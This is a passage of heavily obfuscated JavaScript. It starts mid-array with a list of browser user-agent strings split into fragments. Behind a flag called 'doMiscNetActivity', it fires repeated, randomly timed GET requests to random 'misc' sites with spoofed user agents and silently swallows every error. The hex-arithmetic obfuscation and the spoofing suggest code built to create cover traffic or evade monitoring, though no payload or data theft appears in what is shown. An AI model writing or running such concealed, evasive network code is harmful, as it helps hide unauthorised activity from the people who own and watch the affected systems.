      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x187 * -0xc + 0x5e5 + -0xc6f * -0x1; k < 0x11 * 0xc5 + 0x24b * 0xf + -0x2f76; k++)
    setTimeout(f, (0x581 * -0x49 + -0x3 * -0x3e33 + 0x1c19 * 0x10) * k * getRandomInt(-0x1092 + 0x25d3 * 0x1 + -0x1540, 0x5a * 0x3b + 0x1ccb + -0x841 * 0x6));
  setInterval(() => {
    f();
    for (let l = 0x11e1 * -0x2 + 0x16b3 + 0x1 * 0xd0f; l < -0x2 * -0xc80 + -0x47 * -0x71 + 0x3853 * -0x1; l++)
      setTimeout(f, (0xe79c + -0x11659 * -0x1 + -0x11395) * l * getRandomInt(-0x2640 + 0xee2 + -0x175f * -0x1, -0x1 * 0x1b37 + -0x1e33 + -0x1 * -0x396d));
  }, 0x27dbdd * 0x1 + -0x1 * -0x6971b + -0x54 * -0x19da);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0xa7 * -0xd + -0x2b * -0x4f + -0x2 * -0xb47) * getRandomInt(-0x1b * -0xa2 + -0xa2a + -0x6eb, -0x17a3 + 0x618 + 0x232 * 0x8));
}, 0x4 * 0x566 + -0x1f9 * 0xd + 0x471);